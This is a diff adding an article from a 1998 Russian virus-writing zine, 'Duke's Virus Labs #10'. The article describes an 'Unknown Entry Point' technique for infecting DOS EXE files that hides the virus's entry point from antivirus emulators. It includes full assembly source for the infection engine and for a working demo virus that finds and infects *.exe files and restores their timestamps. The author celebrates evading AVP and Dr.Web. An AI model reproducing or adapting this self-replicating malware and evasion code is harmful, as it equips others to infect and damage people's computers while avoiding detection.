@@ -1,0 +1,927 @@
+- [Duke's Virus Labs #10] - [Page 10] -
+
+Unknown Entry Point Infecting Engine 
+(c) by DaemonSerj
+
+От редактора: Автор предоставил для публикации в журнале полные исходники всех
+              версий UEP Infection Engine. В этой статье представлены
+              исходники последней версии. Исходники других версий, а также 
+              демонстрационные вирусы и программы, вы найдете в прилагающемся 
+              архиве.
+
+
+		   Unknown Entry Point Infecting Engine
+		   ────────────────────────────────────
+
+  Введение
+  ────────
+
+Исследуя этапы развития компьютерных вирусов можно проследить что
+всегда на первом плане были разработки по эффективному распространению
+и борьбе против антивирусов, в достаточной мере друг с другом перекликающиеся
+
+Если на раннем этапе основной проблемой было обнаружение вируса по маске,
+то с появлением продвинутых Mutation Engine эта проблема была в большей мере
+решена .
+
+В настоящее время основную опасность для вируса представляет
+Эмулятор Кода . Как бы вы в своей Mutation не извратились эмулятору
+стоит лишь добраться до Декриптора ,а дальше все как по маслу
+
+Многочисленные антиэвристические приемы с каждой версией Херистика
+исправляются и вирус внесенный в базу прикажет долго жить
+
+
+  Суть Метода
+  ───────────
+
+Основной проблемой является то что управление в программе вирусу
+передается сразу же после загрузки (Исправленная точка входа) и
+эмулятор приступает к анализу непосредственно кодов вируса .
+
+Вообще концепция перехватывания управления у программы в самом начале,
+считалась основополагающей аксиомой, даже не требующей оспаривания
+
+Суть метода в том что передача управления в вирус осуществляется не в
+самом начале ,а в произвольный момент времени
+Основная цель метода в том чтобы Херистик анализировал основные коды
+реальной программы и не добрался бы до передачи управления в вирус
+Если это выполнится ,то он просто незаметит вируса в программе !
+
+То есть если вирус даже внесен в базу он будет дальше преспокойно
+распространяться.Естественно вирус обязан быть полиморфным -
+Кого е@$т чего мы там наворотили,если его можно выцепить по маске
+
+
+  Возможная реализация
+  ────────────────────
+
+Мы должны вставить в тело преграммы переход на вирус в произвольном месте
+
+Конечно передача управления в вирус должна быть межсегментной -
+это либо Jmp far Seg:Offs ,либо Call far Seg:Offs .
+Наиболее приемлемым является использование call far - из стека можно взять
+адрес вызова да и она чаще встречается в программах (см.Ниже),а для
+jmp far пришлось бы хранить в теле адрес Jmp'a .
+
+Вообще реализовать это можно многими способами -
+
+Например непосредственно в теле в произвольном месте заменить несколько
+байт на переход в вирус - недостатки очевидны - непопадание на границу
+кода грозит полным крахом
+
+Наиболее приемлемо - это поиск уже существующего вызова в программе с
+заменой его на вызов вируса:
+
+Например:
+1)	  Просто ищем в теле прграммы байт 9Ah - код Call Far
+	  и заменяем на выход в вирус - Проблема та же -
+	  непопадание на границу кода:
+
+	  mov	al,9Ah <--Найденный байт ,но в программе
+	  ...		  это отнюдь не Far Call
+
+2) Наиболее эффективным и достаточно безопасным явлается поиск Call Far
+через таблицу сегменных адресов в заголовке - по адресу из Header'a
+находим элемент и смотрим если на $-3 стоит байт 9Ah ,то с достаточной
+степенью вероятности можно утверждать что эот Far Call
+
+	 $-3		 $
+	 9Ah,Ofs,Ofs,Relocation
+
+Но вполне возможно такое:    mov   dl,9Ah
+			     nop  <-- любая другая однобайтовая команда
+			     mov   ax,Relocation
+			     mov   ds,ax
+
+И это опять ни какой не Far Call
+
+3) Наиболее безопасным ,но менее эффективным является такой метод:
+   В теле программы ищем стандартную C/Pascal дальнюю процедуру
+   Потом ищем на нее Релокейшн
+
+ ES:LineAddr	 push	bp		   .
+		 mov	bp,sp		   .
+		 .			   .
+		 .			   Call Far Seg:Offs  <──┐
+		 .			   преобразованный в сегментный адрес
+		 pop	bp
+		 retf	[imm8]
+
+   Далее заменяем адрес на нашу точку входа и дописываем вирус в файл
+   Старый адрес надо естественно сохранить
+
+
+  Проблемы и о чем надо помнить
+  ─────────────────────────────
+
+Вообще со здравой точки зрения прерывание естественного хода программы
+является варварством . Чтоб как то компенсировать наши злодеяния мы должны
+для дальнейшей правильной работы программы сохранить исходное состояние,
+а после того как вирус все сделал его нужно восстановить и дальше продолжить
+ход программы - Call Far RealSeg:RealOffs
+
+При сохранении состояния невозможно учесть все ,так как неизвестно какой
+процесс мы прерываем . Минимум - сохранение всех регистров
+
+Также не известно что программа может наворотить до передачи управления вирусу
+
+  Данная реализация
+  ─────────────────
+
+ Unknown Entry Point реализован как ангина - то есть
+
+ OpenFile , Call UEPinfect , SetRealTime , CloseFile
+
+ Ангина не устанавливает идентификатор зараженности - установить самому
+
+ UEP.ASM  -  Первоначально мною был написан UEP третьим способом ,
+с записью в файл стандартным Appending'ом
+Но он показал себя крайне не жизнеспособным из за стандартного заражения
+Многим программам оказалось в кайф затирать память выше себя вместе с вирусом
+
+ UEP_V2.ASM  -	Процедуры поиска и заражения Far Proc не изменились
+Кардинально изменен метод заражения - Вирус записывается между Header'ом
+и программой .
+
+      Корректировка Reloc элементов в заголовке и в теле программы
+      основана на предположении что адреса Reloc Элементов
+      в Header'e линейно возрастают.Если это условие не выполняется
+      файл будет скорректирован неправильно и будет неработоспособным
+
+Эту версию UEP я оставил по причине изящности этого алгоритма(по моему мнению)
+
+ UEP_V3.ASM  -	Процедуры поиска и заражения Far Proc не изменились
+Изменен способ корректировки Reloc элементов на стандартный
+
+ DUMB_UEP.ASM  -  Нерезидентный Бета тестер для всех версий UEP .
+Наполовину состоит из выдранных из моего первого виря DUMB.COM кусков,
+написал я его за 10 минут так что смотреть там особо не на что
+
+
+  Результаты тестов
+  ─────────────────
+
+Было протестировано около 30'и файлов с UEP_v2 , UEP_v3 .
+
+UEP_v2: оказались работоспобными файлы с линейным возрастанием эл-тов в Header'e
+UEP_v3: Все файлы оказались работоспособными
+
+Проехавшись по Бета тОстеру AVP 3.0 и DRWEB'ом 4.00 ,оба пернули чтА EXE.Virus
+Из 30'и файлов AVP обнаружил тОстер в двух ,а WEB ни в одном !!!
+
+  Замечания
+  ─────────
+
+  Требует i386 как минимум - писать под 8086 за&#@ло уже давно
+
+ За реализацию прошу строго не судить - я не вирмак, а так , плюшками балуюсь
+
+ Привет всем вирмейкерам.
+ И Пусть вирусная болезнь DOS перейдет в хроническую стадию ... :)
+
+				       Новосибирск
+				       Июнь '98
+				       NSTU.[СерЖ]
+
+===== begin uep_v3.asm =====
+;		   Unknown Entry Point Infecting Engine
+;		   ────────────────────────────────────
+;			      Version 3.0
+
+MZ_sign 	equ	0
+PartPage	equ	2
+PageCnt 	equ	4
+RelocCnt	equ	6
+HdrSize 	equ	8
+StackPointer	equ	0Eh
+ChekSum 	equ	12h
+EntryCS 	equ	16h
+TablOffs	equ	18h
+
+LenPath 	equ	80h
+
+;Не устанавливает идентификатор зараженности
+;eax - на выходе исходное Дата/Время
+
+UEPinfect	proc	near
+;DS = CS
+;DS - Virus DATA
+
+		mov	bx,[handle]
+		mov	ah,3Fh
+		mov	cx,1Ah
+		mov	dx,offset Header
+		call	DOS
+
+		cmp	word ptr [Header+MZ_sign],'ZM'	;Не EXE'шник
+		jne	ExitUEPInfect
+
+		cmp	word ptr [Header+RelocCnt],0 ;Нет Reloc элементов -
+		je	ExitUEPInfect		     ;нет дальних вызовов
+
+		call	GetFPB	      ;ES:DI - File Parameter Block
+				      ;Будем работать с файлом на уровне FPB
+
+		mov	word ptr fs:[di+2],2   ;Режим открытия - Read/Write
+
+		mov	eax,fs:[di+0Dh]   ;eax - Время/Дата
+		mov	dword ptr [TimeDate],eax
+		mov	edx,fs:[di+11h]   ;edx - RealLen
+		mov	dword ptr [RealLen],edx
+
+		mov	ax,word ptr [Header+PageCnt]
+		cwde
+		shl	eax,9	  ;Реальная длинна больше загружаемой
+		cmp	eax,edx
+		jc	ExitUEPInfect	  ;Скрытый Overlay
+
+		mov	word ptr [ProgID],'ZM'
+
+;отьедем на начало кодового сегмента
+		mov	ax,word ptr [Header+EntryCS]
+		movzx	eax,ax
+		shl	eax,4
+		call	BeginData     ;Начало Code Seg в файле
+		add	eax,edx
+
+		mov	dword ptr [CodeEntry],eax
+
+		mov	fs:[di+15h],eax     ;Отьедем на Code Seg
+
+		mov	ax,word ptr [Header+EntryCS] ;FileCS
+		mov	bx,word ptr [Header+StackPointer]
+		sub	bx,ax
+
+		add	bx,word ptr [Header+HdrSize]   ;Место для Header'a
+						       ;+ THA
+		mov	ax,1000h
+		cmp	ax,bx
+		jnc	@temp4
+		mov	bx,ax  ;BX - сколько параграфов нужно считать из файла
+@temp4: 		       ;Не больше 64Кб
+
+;Выделим память - предполагается что ее достаточно < 64Кб
+		mov	ah,48h
+		call	DOS
+		jc	ExitUEPinfect
+
+		mov	es,ax
+;Читаем кодовый сегмент из файла
+		mov	cx,bx
+		sub	cx,word ptr [Header+HdrSize]
+		shl	cx,4	;в байтах
+		push	ds
+
+		push	es	;DS - на выделенный блок
+		pop	ds
+
+		mov	bx,cs:[handle]
+		mov	ah,3Fh
+		xor	dx,dx
+		call	DOS
+		pop	ds
+		mov	[LenCode],ax
+
+		mov	dx,ax
+		and	ax,0Fh
+		pushf
+		shr	dx,4
+		popf
+		jz	@temp7
+		inc	dx
+@temp7:
+;Сегмент GS - для базирования THA
+		mov	ax,es
+		add	ax,dx
+		mov	gs,ax	   ;База для Header'a
+
+;Ищем точку входа для вируса
+		mov	cx,5	   ;Искать не более 5и процедур
+		mov	word ptr [StartCode],0
+FindUEP:
+		push	cx
+		call	SearchProc   ;Ищем дальнюю процедуру
+		pop	cx
+		jc	FreeBlok     ;Только память зря запоганили...:-E
+		push	cx
+		call	SearchXref   ;Ищем на нее релокейшн
+		pop	cx
+		jnc	UEPisFound
+		loop	FindUEP
+		stc
+		jmp	FreeBlok
+UEPisFound:
+		mov	eax,es:[di]	 ;ES:DI - адрес CALL FAR в CodeSeg
+		mov	[OldReloc],eax	 ;Сохраняем настоящий адрес
+
+		xor	di,di	       ;Сформируем путь для создания TmpFile
+		call	FormTmpPath
+
+		xor	cx,cx
+		mov	ah,3Ch	      ;Создаем TempFile
+		call	DOS
+		push	cs
+		pop	ds
+		jc	FreeBlok
+		mov	[TempHandle],ax
+
+		mov	bx,ax	     ;Место для Скорректированного Header'a
+		call	GetFPB
+		call	BeginData
+		mov	fs:[di+15h],edx
+
+		mov	bx,[handle]
+		call	GetFPB
+		xor	eax,eax
+		mov	fs:[di+15h],eax   ;Отьедем на начало в файле
+
+;Читаем заголовок
+		push	ds
+		push	gs
+		pop	ds
+
+		call	BeginData	;Читаем уже с начала (см. выше)
+		mov	cx,dx
+		xor	dx,dx
+		mov	ah,3Fh
+		call	DOS
+		pop	ds
+
+;		call	MakeMorphVirusCopy	;Заполняет [LenDecryptor]
+;		Здесь вызов какого либо Mutation Engine
+;		Длинна Расшифровщика должна быть помещена в [LenDecryptor]
+
+;Длинна вируса
+
+		mov	ax,VirLen
+		add	ax,[LenDecryptor]
+		mov	dx,ax
+		neg	dl
+		and	dx,0Fh
+		add	ax,dx	 ;AX - длинна вируса выравненная до параграфа
+
+		mov	cx,ax
+
+		shr	ax,4
+		add	word ptr [OldReloc+2],ax
+		mov	bp,ax
+
+;Пишем вирус с DS:VirPlace
+		mov	ah,40h
+		mov	bx,[TempHandle]
+		mov	dx,offset VirPlace
+		call	DOS
+
+;Перекопируем файл в Temp Файл
+
+		xor	dx,dx
+		push	ds
+		push	es
+		pop	ds
+NextCopy:
+		mov	ah,3Fh
+		mov	bx,cs:[Handle]
+		mov	cx,cs:[LenCode]
+		call	DOS
+		mov	cx,ax
+		cmp	ax,0
+		jz	EndCopy
+		mov	ah,40h
+		mov	bx,cs:[TempHandle]
+		call	DOS
+		jmp	NextCopy
+EndCopy:
+		pop	ds
+;Скорректируем сегментные адреса в Header'e и файле
+
+		mov	si,word ptr gs:[TablOffs]
+		mov	cx,word ptr gs:[RelocCnt]
+		mov	bx,[TempHandle]
+		call	GetFPB
+NextAdd:
+		add	gs:[si+2],bp	;Настройка Элемента THA
+		mov	eax,gs:[si]
+		call	MakeLineAddr
+		mov	fs:[di+15h],eax
+		call	UpdateAddr
+
+		add	si,4
+		dec	cx
+		jne	NextAdd
+
+		xor	edx,edx
+		mov	fs:[di+15h],edx
+		mov	dx,bp
+
+;Скорректируем Адрес точки входа и Стека
+
+		add	gs:[StackPointer],bp
+		add	gs:[EntryCS],bp
+
+;Скорректируем длинну в заголовке
+
+		shl	edx,4
+		add	edx,12345678h
+RealLen 	equ	$-4
+
+		mov	ax,dx
+		and	ax,1FFh        ;Новая длинна в заголовке
+		mov	word ptr gs:[PartPage],ax
+		pushf
+		shr	edx,9
+		popf
+		jz	@temp
+		inc	dx
+@temp:
+		mov	word ptr gs:[PageCnt],dx
+
+		;Идентификатор вируса
+		mov	word ptr gs:[ChekSum],VrID
+
+;Пишем Header в Temp File
+		call	BeginData
+		mov	cx,dx
+		xor	dx,dx
+		mov	ah,40h
+		push	ds
+		push	gs
+		pop	ds
+		call	DOS
+		pop	ds
+
+;отьедем на CALL FAR в скорректированном файле
+		mov	edx,12345678h
+CodeEntry	equ	$-4
+
+		movzx	ebp,bp
+		shl	ebp,4
+		add	edx,ebp
+
+		mov	ax,[OffsFarCall]
+		movzx	eax,ax
+		add	edx,eax
+;Отьедем
+		mov	fs:[di+15h],edx
+
+;Точка входа
+		xor	ax,ax
+		push	ax
+		mov	ax,VirEntryPoint
+		push	ax
+
+;Пишем нашу точку входа со стека
+		mov	dx,sp
+		push	ds
+		push	ss
+		pop	ds
+		mov	cx,4
+		mov	ah,40h
+		call	DOS
+		pop	ds
+		add	sp,4
+
+		mov	ah,3Eh	     ;Закроем Temp Файл
+		call	DOS
+;Закроем файл
+		mov	bx,[handle]
+		mov	ah,3Eh
+		call	DOS
+
+;Уничтожим файл
+		mov	dx,offset Path
+		mov	ah,41h
+		call	DOS
+
+;Переименуем Temp файл в заражаемый файл
+		push	ds     ───────────┐
+		push	es		  │
+					  │
+		xor	di,di		  │
+		call	FormTmpPath	  │
+					  │
+		push	cs	       ;DS:DX - Путь Temp файла
+		pop	es		  │
+		mov	di,offset Path	  │
+		mov	ah,56h		  │
+		call	DOS		  │
+					  │
+		pop	es		  │
+		pop	ds    ────────────┘
+
+;Откроем заново Новый файл для последующих действий
+		mov	ah,3Dh
+		mov	dx,offset Path
+		call	DOS
+
+		mov	[handle],ax  ;fs:di - File Parameter Blok
+		mov	bx,ax	     ;заново открытого файла
+		call	GetFPB
+
+;Восстановим Время/Дату
+		mov	eax,12345678h
+TimeDate	equ	$-4
+		clc
+
+FreeBlok:	push	eax
+		pushf
+		mov	ah,49h	     ;Освободим память
+		call	DOS
+		popf
+		pop	eax
+		ret
+ExitUEPInfect:	stc
+		ret
+UEPinfect	endp
+;──────────────────────────────────────────────────────
+SearchProc	proc	near
+;Поиск стандартной дальней процедуры в первых 64Кб кода
+;
+;  Типа:	push	bp	 ИЛИ	  enter immN,immM
+;		mov	bp,sp		    .
+;		 .			    .
+;		 .			    .
+;		 .			    .
+;		pop	bp		  leave
+;		retf [imm8]		  retf	imm8
+;
+;ES - Scanned programm code
+;DS - Virus Data
+
+		mov	dx,0FFFFh	;ID что процедура не найдена
+		mov	cx,[LenCode]
+		mov	[EnterProc],dx
+		mov	di,[StartCode]
+Scan:
+		mov	al,es:[di]
+		cmp	al,55h		;push BP
+		je	pushBP
+		cmp	al,5Dh		;pop BP
+		je	exitPRC
+		cmp	al,0C9h 	;leave
+		je	exitPRC
+NextScan:
+		inc	di
+		dec	cx
+		jne	Scan
+		stc
+		retn
+pushBP:
+		mov	ax,es:[di+1]
+
+		cmp	ax,0EC8Bh	;mov bp,sp
+		je	EnterPRC
+		cmp	ax,0E589h
+		jne	NextScan
+EnterPRC:
+		mov	[EnterProc],di
+		jmp	NextScan
+exitPRC:
+		cmp	[EnterProc],dx
+		je	NextScan
+		mov	al,es:[di+1]
+		cmp	al,0CBh 	;retf
+		je	OK
+		cmp	al,0CAh 	;retf imm8
+		je	OK
+		mov	[EnterProc],dx
+		jmp	NextScan
+OK:		inc	di		;Для поиска следующей
+		mov	[StartCode],di
+		clc
+		ret
+SearchProc	endp
+;────────────────────────────────────────────────────────────────
+SearchXRef	proc	near
+;Ищет Релокейшн на найденную дальнюю процедуру в первых 64Кб кода
+;ES - Scanned programm code
+;DS - Virus Data
+
+		xor	di,di
+		mov	cx,[LenCode]
+		mov	ax,word ptr [Header+EntryCS]
+		mov	dx,[EnterProc]
+		mov	word ptr [OffsetPRC],dx
+		mov	word ptr [OffsetPRC+2],ax
+Search:
+		cmp	byte ptr es:[di],9Ah
+		jne	NextSearch
+TestXref:
+		cmp	dword ptr es:[di+1],12345678h
+OffsetPRC	equ	$-4
+		je	FoundFarCall		;Следующий Сегментный адрес
+		inc	word ptr [OffsetPRC+2]
+		sub	word ptr [OffsetPRC],10h
+		jnc	TestXref
+
+		mov	word ptr [OffsetPRC],dx
+		mov	word ptr [OffsetPRC+2],ax
+NextSearch:
+		inc	di
+		dec	cx
+		jne	Search
+		stc
+		ret
+FoundFarCall:	inc	di
+		mov	[OffsFarCall],di   ; DI - адрес операнда в CALL FAR
+		clc
+		ret
+SearchXRef	endp
+;────────────────────────────────────────────
+BeginData	proc
+;EDX - Начало данных в файле
+		mov	dx,word ptr cs:[Header+HdrSize]
+		movzx	edx,dx
+		shl	dx,4
+		ret
+BeginData	endp
+;────────────────────────────────────────────
+GetFPB		proc
+;Возвращает в FS:DI адрес File Parameter Block
+;BX - Handle
+		push	bx
+		push	ax
+		push	es
+		mov	ax,1220h	;Номер входа в SFT
+		int	2Fh		;ES:[di]
+
+		mov	bl,es:[di]	;Получим блок описания файла
+		mov	ax,1216h	;es:di
+		int	2Fh
+
+		push	es
+		pop	fs
+
+		pop	es
+		pop	ax
+		pop	bx
+		ret
+GetFPB		endp
+;──────────────────────────────────────────────────
+FormTmpPath	proc
+;Сформировать путь к Temp файлу
+;На входе - куда : ES:DI
+;На выходе - где : DS:DX
+
+		push	cs
+		pop	ds
+
+		mov	si,offset Path
+		push	si	───────────────────┐
+		mov	word ptr [EndDir],si	   │
+		mov	ax,si			   │
+		inc	ax			   │
+@temp5: 					   │
+		cmp	byte ptr [si],'\'	   │
+		jne	$+5			   │
+		mov	word ptr [EndDir],ax	   │
+						   │
+		cmp	byte ptr [si],'/'	   │
+		jne	$+5			   │
+		mov	word ptr [EndDir],ax	   │
+						   │
+		cmp	byte ptr [si],0 	   │
+		je	CopyDir 		   │
+		inc	si			   │
+		inc	ax			   │
+		jmp	@temp5			   │
+CopyDir:					   │
+		pop	si   ──────────────────────┘
+
+		push	di	    ─────────────┐
+		mov	dx,offset Path ;Конец пути,после пристыкуем файл
+EndDir		equ	$-2			 │
+		cmp	si,dx			 │
+		je	CopyName		 │
+@temp2: 					 │
+		lodsb				 │
+		stosb				 │
+		cmp	si,dx			 │
+		jne	@temp2			 │
+CopyName:					 │
+		mov	si,offset UEPTempFile	 │
+		mov	cx,LenUEPfile		 │
+		cld		       ;Пристыкуем имя файла
+		rep	movsb			 │
+						 │
+		pop	dx     ──────────────────┘
+		push	es
+		pop	ds
+		ret
+FormTmpPath	endp
+;───────────────────────────────────────
+UpdateAddr	proc
+		push	cx
+		mov	dx,offset AddSeg
+		mov	cx,2
+		mov	ah,3Fh
+		call	DOS
+
+		sub	dword ptr fs:[di+15h],2
+		add	[AddSeg],bp
+
+		mov	ah,40h
+		call	DOS
+		pop	cx
+		ret
+UpdateAddr	endp
+;───────────────────────────────────────
+MakeLineAddr	proc
+;Из сегментного формирует линейный адрес
+		mov	dx,ax
+		movzx	edx,dx
+		xor	ax,ax
+		ror	eax,16
+		shl	eax,4
+		add	eax,edx
+		call	BeginData
+		add	eax,edx
+		ret
+MakeLineAddr	endp
+;─────────────── UEP Engine DATA ─────────────────
+UEPTempFile	db	'uepfile.tmp',0
+LenUEPfile	equ	$-UEPTempFile
+StartCode	dw	0
+LenCode 	dw	0
+EnterProc	dw	0
+OffsFarCall	dw	0
+TempHandle	dw	0
+ProgID		dw	'MZ'
+AddSeg		dw	0
+OldReloc	dd	0
+;─────────────────────────────────────────────────
+===== end   uep_v3.asm =====
+
+
+Демонстрационный вирус :
+
+===== begin dumb_uep.asm =====
+;Non.TSR.UEP.EXE.Infector - BETA TESTER of Unknown Entry Point
+
+VrID		=	'DU'
+VirEntryPoint	=	0000h
+VirPlace	=	0000h
+
+		model	small
+		.486
+UEPtest 	segment para public use16 'code'
+		assume	cs:UEPtest,ds:UEPtest,ss:UEPstack
+		org	0000h
+		pop	dword ptr cs:[ReturnAddres]
+Entry:
+		pushad
+		pushfd
+		push	ds
+		push	es
+		push	fs
+		push	gs
+
+		call	Realloc
+
+		xor	ax,ax	       ;Как бы перехват векторов
+		mov	ds,ax
+		les	bx,ds:[21h*4]
+		mov	word ptr cs:[int21h],bx
+		mov	word ptr cs:[int21h+2],es
+
+		push	cs
+		pop	ds
+
+		mov	ah,62h
+		int	21h
+
+		les	di,dword ptr [ReturnAddres]
+
+		mov	eax,[OldReloc]
+		mov	es:[di-4],ax
+		ror	eax,16
+		add	ax,bx
+		add	ax,10h
+		mov	es:[di-2],ax
+		sub	di,5
+@@temp:
+		mov	es,bx
+		xor	di,di
+
+		mov	word ptr [Jump],di
+		mov	word ptr [Jump+2],es
+
+		mov	dword ptr [@@temp],90909090h
+
+		MOV	AH,1AH			;УСТАНОВИЛИ НОВЫЙ DTA
+		MOV	DX,OFFSET NEW_DTA
+		INT	21H
+
+		MOV	CX,23H		;СКРЫТЫЙ , АРХИВНЫЙ , READ ONLY
+		MOV	AH,4EH
+		MOV	DX,OFFSET exe_MASK
+		INT	21H
+		JC	exit@
+CONTINUE:
+		MOV	AX,3D02H
+		MOV	DX,OFFSET NEW_DTA+1EH	;АДРЕС ИМЕНИ ФАЙЛА В DTA
+		INT	21H
+		JC	F_NEXT
+
+		MOV	BX,AX
+		MOV	[HANDLE],AX
+
+		MOV	AX,5700H	;ПОЛУЧИМ ДАТУ
+		INT	21H
+		JC	FIND_NEXT
+
+		cmp	cl,0ffh
+		je	Find_Next
+
+		call	UEPinfect	;Вызов Unknown Entry Point
+		jc	Find_Next
+
+		or	al,0ffh
+		mov	cx,ax
+		ror	eax,16
+		mov	dx,ax
+
+		MOV	AX,5701H	 ;УСТАНОВИМ СТАРОЕ ВРЕМЯ
+		INT	21H
+
+		MOV	AH,3EH
+		INT	21H
+exit@:
+		mov	ah,62h
+		int	21h
+
+		mov	ds,bx
+		MOV	AH,1AH		;ВЕРНЕМ DTA НА МЕСТО
+		MOV	DX,80H
+		INT	21H
+
+		pop	gs
+		pop	fs
+		pop	es
+		pop	ds
+		popfd
+		popad
+		db	0EAh
+Jump		dd	0
+
+FIND_NEXT:
+		MOV	BX,[HANDLE]
+		MOV	AH,3EH
+		INT	21H
+F_NEXT:
+		MOV	AH,4FH
+		MOV	DX,OFFSET NEW_DTA
+		MOV	CX,23H
+		INT	21H
+		JC	exit@
+		JMP	CONTINUE
+
+Include 	uep_v3.asm
+
+DOS		proc	near
+		pushf
+		db	9Ah	  ;call far ptr int21h
+int21h		dd	0
+		ret
+DOS		endp
+
+Realloc 	proc
+		mov	ah,62h
+		int	21h
+
+		mov	es,bx
+		dec	bx
+		mov	ds,bx
+
+		cmp	byte ptr ds:[0],'Z'
+		jne	@notRealloc
+
+		mov	ax,word ptr ds:[0003]
+		sub	ax,1010h
+		mov	bx,ax
+
+		mov	ah,4Ah
+		int	21h
+@notRealloc:
+		ret
+Realloc 	endp
+
+;-------------- DATA AREA -------------
+ReturnAddres	dw	1000h,SEG UEPtest
+lendecryptor	dw	0
+handle		dw	0
+New_Dta 	db	30h dup (0ffh)
+Path		equ	offset new_dta+1Eh
+exe_MASK	db	'*.exe',0
+DUMB		db	'<DUMB.UEP.Beta.Tester>',0
+Author		db	'UEP written by СерЖ (C) 1998,NSTU,Nsk',0
+Header		db	1Ah dup (0ffh)
+
+VirLen		equ	offset $
+UEPtest 	ends
+
+UEPstack	segment para stack 'stack'
+		db	100h dup(?)
+UEPstack	ends
+		end	Entry
+===== end   dumb_uep.asm =====
